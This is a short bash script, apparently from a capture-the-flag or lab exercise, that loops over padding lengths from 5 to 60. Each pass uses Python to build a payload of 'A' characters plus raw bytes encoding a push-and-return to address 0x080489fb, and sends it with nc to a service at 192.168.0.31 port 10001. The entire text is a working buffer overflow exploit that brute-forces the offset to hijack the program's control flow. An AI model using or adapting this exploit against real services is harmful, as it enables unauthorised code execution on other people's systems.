
for i in {5..60}; do
	python -c "print 'A'*$i+'\x68\xfb\x89\x04\x08\xc3'" | nc 192.168.0.31 10001
done